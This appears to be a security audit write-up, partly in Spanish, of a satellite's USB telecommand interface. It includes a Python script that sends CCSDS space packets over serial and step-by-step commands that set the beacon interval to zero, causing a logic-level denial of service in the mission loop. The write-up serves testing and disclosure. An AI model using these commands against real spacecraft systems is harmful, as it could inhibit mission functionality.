# USB interface audtoring

## Scenario

El cliente nos solicita validar el funcionamiento de su satelite utilizando las interfaces usb como simulacion del canal de radifrecuencia

## Frame
- **Access:** White box
- **Environment:** Static/Offline Analysis, Dinamic

## Tooling

```python
from pwn import *
from spacepackets.ccsds.spacepacket import SpHeader
import serial
import time

PORT = "/dev/cu.usbmodemfsat3"
BAUD = 921600

tc_header = SpHeader.tc(apid=6, seq_count=5, data_len=0)
telecommand = tc_header.pack()

success(f"Raw SPP payload: {telecommand.hex()}")
info(f"Sending {len(telecommand)} characters over {PORT}...")

try:
    with serial.Serial(PORT, BAUD, timeout=1) as ser:
        time.sleep(2)
        ser.write(telecommand + b"\n")
        ser.flush()
        time.sleep(0.5)
        success("Payload delivered successfully!")
except Exception as e:
    print(f"Error opening serial port: {e}")
```

## Execution

**Target:** APID `0x05`, SET_BEACON_RATE.

**Purpose:** Show how a valid configuration command can degrade normal mission behavior.

**Payload Format:**

```text
byte 0: beacon interval in seconds
byte 1: padding byte for the current firmware unpacker
```

The handler reads `data[0]`, rejects values above `10`, and accepts `0`. The second byte is not part of the intended command semantics; it is included in the lab payload because the current unpacker does not copy one-byte payloads when the SPP length field is `0`.

**Mechanism:**

When the interval is `0`, the telemetry worker condition becomes true almost continuously:

```text
t_radio_beacon.interval != 15000 &&
millis() - previous > interval
```

**USB Reproduction:**

1. Record the normal beacon cadence for at least 30 seconds.
2. Build a safe high-rate beacon command. The helper adds a padding byte after the interval:

   ```shell
   python3 scripts/usb_tc_send.py --port /dev/cu.usbmodemfsat3 --command beacon --seconds 1 --dry-run
   ```

3. Send the one-second beacon command and observe the increased cadence:

   ```shell
   python3 scripts/usb_tc_send.py --port /dev/cu.usbmodemfsat3 --command beacon --seconds 1
   ```

4. Build the edge case that sets the interval to zero:

   ```shell
   python3 scripts/usb_tc_send.py --port /dev/cu.usbmodemfsat3 --command beacon --seconds 0 --dry-run
   ```

5. Send the zero-second interval only during a controlled lab window:

   ```shell
   python3 scripts/usb_tc_send.py --port /dev/cu.usbmodemfsat3 --command beacon --seconds 0 --read-seconds 0.2
   ```

6. Observe USB/downlink traffic volume and normal telemetry readability.
7. Restore a less aggressive interval with `--seconds 5`, or reset the board if the loop becomes difficult to observe.


**Expected Observations:**

- Repeated beacon telemetry.
- Increased USB/downlink traffic.
- Normal telemetry cadence becomes harder to observe.


**Impact:**

This is a logic-level denial of service against the mission loop.

- `DE-0002.03 Inhibit Spacecraft Functionality`



## Findings
La libreria cuenta con un DOS en varios paquetes
